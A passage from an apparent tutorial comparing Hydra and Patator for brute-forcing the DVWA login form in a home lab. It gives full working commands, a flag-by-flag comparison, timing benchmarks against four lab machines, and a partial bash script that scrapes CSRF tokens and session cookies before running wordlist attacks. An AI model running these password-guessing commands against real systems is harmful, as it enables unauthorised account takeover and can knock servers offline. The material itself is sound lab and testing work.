&lt;code&gt;patator http_fuzz 1=/usr/share/seclists/Usernames/top_shortlist.txt 0=/usr/share/seclists/Passwords/500-worst-passwords.txt --threads=1 timeout=1 --rate-limit=1 url="http://192.168.1.33/DVWA/login.php" method=POST body="username=FILE1&amp;amp;password=FILE0&amp;amp;user_token=${CSRF}&amp;amp;Login=Login" header="Cookie: security=impossible; PHPSESSID=${SESSIONID}" -x ignore:fgrep=login.php -x quit:fgrep=index.php follow=0 accept_cookie=0 http_proxy=127.0.0.1:8080&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Breakdown&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Main Program&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;hydra&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;patator&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;List of usernames to use&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-L /usr/share/seclists/Usernames/top_shortlist.txt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;0=/usr/share/seclists/Usernames/top_shortlist.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;List of passwords to use&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-P /usr/share/seclists/Passwords/500-worst-passwords.txt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;1=/usr/share/seclists/Passwords/500-worst-passwords.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Use empty passwords/repeat username as password&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-e ns&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;strong&gt;N/A&lt;/strong&gt;. Does not have the option&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Try all the passwords, before trying the next password&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-u&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: The password wordlist (&lt;code&gt;FILE0&lt;/code&gt;) has a &lt;strong&gt;lower ID&lt;/strong&gt; than the username wordlist (&lt;code&gt;FILE1&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Quit after finding a valid login&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-F&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;-x quit:fgrep=index.php&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Limit the threads&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-t 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;--threads=1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Timeout value on request&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-w 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;timeout=1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Timeout before starting next thread&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-W 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;--rate-limit=1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Verbose (aka show redirects)&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-v&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;strong&gt;N/A&lt;/strong&gt;. Does it out of the box&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Verbose (aka show redirects)&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-v&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;strong&gt;N/A&lt;/strong&gt;. Does it out of the box. Done via whitelisting. This is what is used to signal a correct login (&lt;code&gt;-x quit:fgrep=index.php&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Show password attempts&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;-V&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;strong&gt;N/A&lt;/strong&gt;. Does it out of the box. Done via blacklisting. It is the opposite, need to hide it (&lt;code&gt;-x ignore:fgrep=login.php&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Target to attack&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;192.168.1.33&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;strong&gt;N/A&lt;/strong&gt;. Happens later (&lt;code&gt;url="http://192.168.1.33/DVWA/login.php"&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Module to use&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;http-post-form&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;http_fuzz&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;How to transmit the data&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;strong&gt;N/A&lt;/strong&gt;. It is done in the module name. (&lt;code&gt;http-post-form&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;method=POST&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Web page to attack&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;"/DVWA/login.php:&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;url="http://192.168.1.33/DVWA/login.php"&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;POST data to send&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;username=^USER^&amp;amp;password=^PASS^&amp;amp;user_token=${CSRF}&amp;amp;Login=Login:&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;body="username=FILE1&amp;amp;password=FILE0&amp;amp;user_token=${CSRF}&amp;amp;Login=Login"&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Cookie data to send&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;header="Cookie: security=impossible; PHPSESSID=${SESSIONID}"&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Whitelist page response&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;:S=Location\: login.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;-x ignore:fgrep=login.php&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Blacklist page response&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;:F=Location\: index.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;-x quit:fgrep=index.php&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Do not follow requests&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;strong&gt;N/A&lt;/strong&gt;. Have to link in a proxy&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;follow=0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Do not accept cookies&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;strong&gt;N/A&lt;/strong&gt;. Have to link in a proxy&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;accept_cookie=0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Use in a HTTP proxy&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hydra: &lt;code&gt;export HYDRA_PROXY_HTTP=http://127.0.0.1:8080&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Patator: &lt;code&gt;http_proxy=127.0.0.1:8080&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;As you can see, the flags and command line arguments for Patator are not as "straightforward" as Hydra, however, it allows you to customise without being dependant on other software. This chart is only an example for doing this module. Patator has many other options which are not covered here (same goes for Hydra). Examples: able to-do both blacklisting and whitelisting at the same time, able to specifically define what values to look for and ignore (as well as chaining them up with ANDs &amp;amp; ORs statements).&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Benchmarking"&gt;&lt;/a&gt;
&lt;h2&gt;Benchmarking&lt;/h2&gt;

&lt;p&gt;So far, everything has been a single target. Let's step up our game and test a few more different environments and setups - and let's see if it makes a difference at all.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;4x Operating Systems (Arch Linux, Raspbian Jessie, Windows Server 2012 &amp;amp; Windows XP)&lt;/li&gt;
&lt;li&gt;2x Apaches (One Windows, One Linux)&lt;/li&gt;
&lt;li&gt;2x Windows (One Apache, One IIS)&lt;/li&gt;
&lt;li&gt;2x Linux (One Apache, One Nginx)&lt;/li&gt;
&lt;li&gt;2x Raspberry Pis "B" (One v1, One v2)&lt;/li&gt;
&lt;li&gt;2x Virtual Machines&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Hopefully this should give some comparison results.&lt;/p&gt;

&lt;p&gt;Each service is using the "out of the box" values. No performance tweaks have been made.&lt;/p&gt;

&lt;p&gt;The very low timeout value (it is not wise to be this low - 3 seconds), and the same wordlist (correct value will be at 508 requests) along with every other possible setting the same on each program.&lt;/p&gt;

&lt;p&gt;The looping order has been done to move from target to target, rather than doing all the attacks towards a target. This will allow the target machine to "recover" before getting brute forced again. This test was repeated five times to calculate an average.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;: Generally using Patator is quicker than Hydra, however, it noticeably used up a lot more system resources.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Hardware&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;192.168.1.11&lt;/code&gt; - Raspberry Pi v1 "B" // Nginx&lt;/li&gt;
&lt;li&gt;&lt;code&gt;192.168.1.22&lt;/code&gt; - Raspberry Pi v2 "B" // Apache&lt;/li&gt;
&lt;li&gt;&lt;code&gt;192.168.1.33&lt;/code&gt; - Windows XP // Apache&lt;/li&gt;
&lt;li&gt;&lt;code&gt;192.168.1.44&lt;/code&gt; - Windows Server 2012 // IIS&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;strong&gt;&lt;code&gt;192.168.1.11&lt;/code&gt; (aka: Arch Pi)&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Machine: &lt;strong&gt;Raspberry Pi v1 "B"&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Web Server: &lt;strong&gt;Nginx v1.8.0&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Server Side Scripting: &lt;strong&gt;PHP v5.6.14&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Database: &lt;strong&gt;MariaDB v10.0.21&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;OS: &lt;strong&gt;Arch Linux 2015.10.01&lt;/strong&gt; / Linux archpi 4.1.9-1-ARCH #1 PREEMPT Thu Oct 1 19:15:46 MDT 2015 armv6l GNU/Linux&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Single threads vs multiple thread; there is a difference. However, using any more than two threads does not make it that much quicker. Other machines were able to handle more threads. This machine and setup had the slowest brute force time.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;&lt;code&gt;192.168.1.22&lt;/code&gt; (Aka: Raspbian)&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Machine: **Raspberry Pi v2 "B"&lt;/li&gt;
&lt;li&gt;Web Server: &lt;strong&gt;Apache v2.4.10&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Server Side Scripting: &lt;strong&gt;PHP v5.6.13&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Database: &lt;strong&gt;MySQL v5.5.44&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;OS: &lt;strong&gt;Raspbian Jessie September 2015&lt;/strong&gt; / Linux raspberrypi 4.1.7-v7+ #817 SMP PREEMPT Sat Sep 19 15:32:00 BST 2015 armv7l GNU/Linux&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;The more threads, the quicker the result. It was able to handle more requests than &lt;code&gt;192.168.1.11&lt;/code&gt;. This had the fastest brute force time.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;&lt;code&gt;192.168.1.33&lt;/code&gt; (aka: XP XAMPP)&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Machine: &lt;strong&gt;VM - 512MB / 1 CPU&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Web Server: &lt;strong&gt;Apache v2.4.10&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Server Side Scripting: &lt;strong&gt;PHP v5.4.31&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Database: &lt;strong&gt;MySQL v5.5.39&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;OS: &lt;strong&gt;Windows XP Professional SP3 ENG x86&lt;/strong&gt; (Using &lt;strong&gt;XAMPP v1.8.2 package&lt;/strong&gt;)&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Any more than a single thread, killed the box.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;&lt;code&gt;192.168.1.44&lt;/code&gt; (aka: 2012 IIS)&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Machine: &lt;strong&gt;VM - 2GB / 1 CPU&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Web Server: &lt;strong&gt;IIS v8.0&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Server Side Scripting: &lt;strong&gt;PHP v5.6.0&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Database: &lt;strong&gt;MySQL v5.5.45&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;OS: &lt;strong&gt;Windows Server 2012 ENG x64&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Single threads vs multiple threads there is a difference. Did start to struggle towards the end where there was a large number of threads&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Results&lt;/strong&gt;:&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt; &lt;strong&gt;HYDRA&lt;/strong&gt;   &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.11&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.22&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.33&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.44&lt;/strong&gt; &lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt; 1 Thread    &lt;/td&gt;
&lt;td&gt; 80               &lt;/td&gt;
&lt;td&gt; 47               &lt;/td&gt;
&lt;td&gt; 62               &lt;/td&gt;
&lt;td&gt; 37               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 2 Threads   &lt;/td&gt;
&lt;td&gt; 70               &lt;/td&gt;
&lt;td&gt; 28               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 26               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 4 Threads   &lt;/td&gt;
&lt;td&gt; 70               &lt;/td&gt;
&lt;td&gt; 23               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 25               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 8 Threads   &lt;/td&gt;
&lt;td&gt; 73               &lt;/td&gt;
&lt;td&gt; 26               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 25               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 16 Threads  &lt;/td&gt;
&lt;td&gt; 71               &lt;/td&gt;
&lt;td&gt; 23               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 26               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 32 Threads  &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 21[*]            &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 31               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt; &lt;strong&gt;PATATOR&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.11&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.22&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.33&lt;/strong&gt; &lt;/th&gt;
&lt;th&gt; &lt;strong&gt;192.168.1.44&lt;/strong&gt; &lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt; 1 Thread    &lt;/td&gt;
&lt;td&gt; 68               &lt;/td&gt;
&lt;td&gt; 26               &lt;/td&gt;
&lt;td&gt; 46               &lt;/td&gt;
&lt;td&gt; 21               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 2 Threads   &lt;/td&gt;
&lt;td&gt; 71               &lt;/td&gt;
&lt;td&gt; 24               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 19               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 4 Threads   &lt;/td&gt;
&lt;td&gt; 72               &lt;/td&gt;
&lt;td&gt; 27               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 22               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 8 Threads   &lt;/td&gt;
&lt;td&gt; 71               &lt;/td&gt;
&lt;td&gt; 26               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 21               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 16 Threads  &lt;/td&gt;
&lt;td&gt; 72               &lt;/td&gt;
&lt;td&gt; 20               &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 26               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt; 32 Threads  &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 32[**]           &lt;/td&gt;
&lt;td&gt; -                &lt;/td&gt;
&lt;td&gt; 23               &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;td&gt;------------------&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;


&lt;ul&gt;
&lt;li&gt;[*] == One pass did not not find the password.&lt;/li&gt;
&lt;li&gt;[**] == More than one thread timeout, but still found the password.&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Benchmark Script&lt;/strong&gt;&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;span class="line-number"&gt;35&lt;/span&gt;
&lt;span class="line-number"&gt;36&lt;/span&gt;
&lt;span class="line-number"&gt;37&lt;/span&gt;
&lt;span class="line-number"&gt;38&lt;/span&gt;
&lt;span class="line-number"&gt;39&lt;/span&gt;
&lt;span class="line-number"&gt;40&lt;/span&gt;
&lt;span class="line-number"&gt;41&lt;/span&gt;
&lt;span class="line-number"&gt;42&lt;/span&gt;
&lt;span class="line-number"&gt;43&lt;/span&gt;
&lt;span class="line-number"&gt;44&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;#!/bin/bash&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;killall -9 hydra
&lt;/span&gt;&lt;span class="line"&gt;killall -9 patator
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;for&lt;/span&gt; LOOP in &lt;span class="k"&gt;$(&lt;/span&gt;seq &lt;span class="m"&gt;1&lt;/span&gt; 3&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;for&lt;/span&gt; THREAD in &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="m"&gt;8&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt; 32&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="c"&gt;## Hydra loop&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="k"&gt;for&lt;/span&gt; IP in &lt;span class="m"&gt;11&lt;/span&gt; &lt;span class="m"&gt;22&lt;/span&gt; &lt;span class="m"&gt;33&lt;/span&gt; 44&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s2"&gt;&amp;quot;\n\n192.168.1.${IP} // ${THREAD}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;CSRF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;curl -s -c dvwa.cookie &lt;span class="s2"&gt;&amp;quot;192.168.1.${IP}/DVWA/login.php&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; awk -F &lt;span class="s1"&gt;'value='&lt;/span&gt; &lt;span class="s1"&gt;'/user_token/ {print $2}'&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d &lt;span class="s2"&gt;&amp;quot;'&amp;quot;&lt;/span&gt; -f2&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;SESSIONID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;grep PHPSESSID dvwa.cookie &lt;span class="p"&gt;|&lt;/span&gt; awk -F &lt;span class="s1"&gt;' '&lt;/span&gt; &lt;span class="s1"&gt;'{print $7}'&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;export &lt;/span&gt;&lt;span class="nv"&gt;HYDRA_PROXY_HTTP&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;http://127.0.0.1:8080&lt;span class="p"&gt;;&lt;/span&gt; rm -f hydra.restore
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nb"&gt;time &lt;/span&gt;hydra -L /usr/share/seclists/Usernames/top_shortlist.txt -P /usr/share/seclists/Passwords/passwords_clarkson_82.txt &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -u -F -t &lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;THREAD&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt; -w &lt;span class="m"&gt;1&lt;/span&gt; 192.168.1.&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;IP&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt; http-post-form &lt;span class="se"&gt;\&lt;/span&gt;
